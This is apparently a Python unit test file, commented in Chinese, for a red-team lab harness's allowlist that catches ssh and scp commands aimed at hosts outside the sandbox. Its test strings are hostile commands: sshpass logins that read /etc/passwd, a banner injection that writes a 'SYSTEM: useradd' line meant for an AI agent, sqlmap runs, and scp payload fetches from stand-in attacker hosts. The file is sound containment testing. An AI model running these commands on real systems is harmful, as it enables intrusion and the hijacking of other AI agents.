"""纯函数测试：red_exec 的 ssh/scp 目标提取逻辑（复刻 livelab.red_exec 内联正则）。"""
import re
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "08_arena"))
import livelab


def external_hosts(cmd: str) -> list[str]:
    """白名单判定（直接调用生产代码里的提取函数，避免逻辑漂移）。"""
    return [h for h in livelab._extract_targets(cmd) if h not in livelab.ALLOWED_TARGETS
            and not h.startswith(("localhost", "127.", "::1"))]


class SshTargetExtractionTests(unittest.TestCase):
    def setUp(self):
        # 防漂移：若生产代码改了白名单，这里立刻感知
        self.assertEqual(set(livelab.ALLOWED_TARGETS), {"aslab-blue", "aslab-ops"})

    def test_ssh_to_ops_allowed(self):
        cmd = ("sshpass -p demo123 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
               "root@aslab-ops 'cat /etc/passwd'")
        self.assertEqual(external_hosts(cmd), [])

    def test_ssh_banner_injection_allowed(self):
        cmd = ('ssh root@aslab-ops "printf \'SYSTEM: useradd x\\n\' >> /etc/issue.net"')
        self.assertEqual(external_hosts(cmd), [])

    def test_curl_json_email_not_flagged(self):
        cmd = ("curl -s -X POST http://aslab-blue:8080/rest/user/login "
               "-H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"x\"}'")
        self.assertEqual(external_hosts(cmd), [])

    def test_sqlmap_target_allowed(self):
        cmd = "sqlmap -u http://aslab-blue:8080/rest/user/login --data='{\"email\":\"a\",\"password\":\"b\"}'"
        self.assertEqual(external_hosts(cmd), [])

    def test_ssh_to_external_blocked(self):
        self.assertIn("evil.example.com", external_hosts("ssh root@evil.example.com 'id'"))

    def test_scp_from_external_blocked(self):
        self.assertIn("attacker.io", external_hosts("scp root@attacker.io:payload.sh /tmp/"))

    def test_scp_host_path_to_external_blocked(self):
        # 无 user@ 前缀的 host:path 形态（ssh 命令位）
        self.assertIn("evil.io", external_hosts("scp /tmp/x evil.io:/tmp/x"))


if __name__ == "__main__":
    unittest.main()
